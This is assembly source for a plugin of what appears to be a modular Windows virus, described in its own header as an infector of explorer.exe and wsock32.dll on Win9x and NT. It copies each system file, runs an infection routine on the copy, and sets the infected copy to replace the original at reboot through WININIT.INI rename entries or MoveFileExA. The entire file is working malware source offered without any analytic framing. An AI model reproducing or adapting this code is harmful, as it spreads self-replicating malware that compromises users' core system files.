   ; EXPLORER
   ; ~~~~~~~~
   ; - %windir%\explorer.exe infector for win9X/NT
   ; - %sysdir%\wsock32.dll

   include                 INCLUDE\s2c.inc
   include                 k32man.inc
   include                 infmanx.inc
   include                 util.inc

   include                 plugin.inc
                           PLUGIN_START    EXPLORER, W32R3, PERMUTABLE

   handleevent:            hookevent EV_EXPLORER_INFECT, main
                           stc
                           retn

   main:                   pusha
                           sub     esp, 260*3+32
                           cld

   _file_src               =       (byte ptr 0)      ; %windir%\exefile
   _file_dst               =       (byte ptr 260)    ; %windir%\tempfile
   _file_wii               =       (byte ptr 260*2)  ; %windir%\WININIT.INI (md9X)
   _rename                 =       (byte ptr 260*3)  ; [rename]

                           lea     edx, [esp]._file_wii
                           event   EV_UTIL_GETWINDIR
                           x_stosd WININIT.INI~

                           lea     edi, [esp]._rename
                           x_stosd rename~

                           lea     edx, [esp]._file_src
                           event   EV_UTIL_GETWINDIR
                           x_stosd EXPLORER.EXE~

                           lea     edx, [esp]._file_dst
                           event   EV_UTIL_GETWINDIR
                           x_stosd EXPLORER.SWP~

                           call    infect

                           lea     edx, [esp]._file_src
                           event   EV_UTIL_GETSYSDIR
                           x_stosd WSOCK32.DLL~

                           lea     edx, [esp]._file_dst
                           event   EV_UTIL_GETSYSDIR
                           x_stosd WSOCK32.SWP~

                           call    infect

                           add     esp, 260*3+32
                           popa
                           clc
                           retn    ; main

   infect:                 lea     edx, [esp+4]._file_src
                           event   EV_INFMANX_DO_INFECT
                           dec     eax
                           jz      __exit ; infected (just now or alredy)

                           lea     eax, [esp+4]._file_dst
                           lea     ebx, [esp+4]._file_src

                           push    0
                           push    eax
                           push    ebx
                           callX   CopyFileA
                           or      eax, eax
                           jz      __exit

                           lea     edx, [esp+4]._file_dst
                           event   EV_INFMANX_DO_INFECT
                           or      eax, eax
                           jz      __error ; not infected

                           event   EV_UTIL_IS_W9X
                           jne     __winnt

   __win95:                lea     eax, [esp+4]._file_wii
                           lea     ebx, [esp+4]._file_dst
                           lea     ecx, [esp+4]._file_src
                           lea     edx, [esp+4]._rename
                           push    eax
                           push    ebx
                           push    ecx
                           push    edx
                           callX   WritePrivateProfileStringA

                           jmp     __exit

   __winnt:                lea     ecx, [esp+4]._file_src
                           push    4       ; delay_until_reboot
                           push    0
                           push    ecx
                           callX   MoveFileExA

                           lea     ecx, [esp+4]._file_src
                           lea     edx, [esp+4]._file_dst

                           push    4 ; delay_until_reboot
                           push    ecx
                           push    edx
                           callX   MoveFileExA

   __exit:                 retn

   __error:                lea     eax, [esp+4]._file_dst
                           push    eax
                           callX   DeleteFileA

                           retn

                           PLUGIN_END
